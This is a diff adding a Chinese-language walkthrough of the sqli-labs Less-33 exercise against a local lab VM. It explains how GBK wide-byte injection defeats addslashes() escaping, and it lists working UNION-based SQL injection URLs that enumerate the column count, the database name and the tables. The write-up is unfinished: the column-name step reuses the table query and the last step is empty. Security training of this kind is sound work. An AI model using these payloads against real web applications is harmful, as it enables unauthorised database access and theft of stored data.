@@ -1,0 +1,40 @@
+http://10.0.2.15/sqli/Less-33/?id=1'
+显示：
+Hint: The Query String you input is escaped as : 1\'
+说明代码会自动在'之前加上转义符，导致单引号没办法闭合
+于是想到能否用宽字节进行注入
+
+一般有两种思路：
+1.%DF连带\
+如果程序的默认字符集是GBK等宽字节字符集，就有可能产生宽字节注入，绕过上述过滤。
+若在PHP中使用mysql_query("set name gbk")将默认字符集设置为GBK，而使用addslashes()转义用户输入，此时如果用户输入%DF%27（%DF'），则addslashes()会在%27前面加上一个%5C字符（\）
+而Mysql在使用GBK编码时，会认为两个字符为一个汉字，也就是说%DF%5C为一个宽字符（前一个ASCII大于128才能到汉字的范围），也就是 縗'，也就是说%DF%5C%27=縗' ，这样单引号就未被转义，能闭合语句，从而产生SQL注入。%DF不是唯一一个可以产生宽字节注入的字符，理论上%81-%FE均可。
+2.过滤\'中的\
+构造%DF%5C%5C%27，addslashes()会在两个%5C和%27之前都加上\即%5C，变为%DF %5c%5c %5c%5c %5c%27
+但宽字符集认为%DF%5c是一个字符即縗，则%DF%5c %5c%5c %5c%5c %27即 縗\\\\' ，四个\正好转义为两个\，即'未被转义
+
+http://10.0.2.15/sqli/Less-33/?id=1%DF'
+报错：
+' 1�\'' LIMIT 0,1 '
+于是可以猜测sql：
+select 字段名 from 表名 where id = '输入的id' limit 0,1;
+
+1.字段数
+http://10.0.2.15/sqli/Less-33/?id=1%DF' order by 3 --+
+正常显示
+http://10.0.2.15/sqli/Less-33/?id=1%DF' order by 4 --+
+报错。说明字段数为3
+
+2.数据库名
+http://10.0.2.15/sqli/Less-33/?id=0%DF' union select 1,database(),3 --+
+数据库名：security
+
+3.表名
+http://10.0.2.15/sqli/Less-33/?id=0%DF' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = database()),3 --+
+表名：users,uagents,emails,referers
+
+4.字段名
+http://10.0.2.15/sqli/Less-33/?id=0%DF' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 'security'),3 --+
+但因为'security'中单引号会被转义，所以现在也没想好怎么爆，先睡了，期待茅塞顿开- -
+
+5.字段值
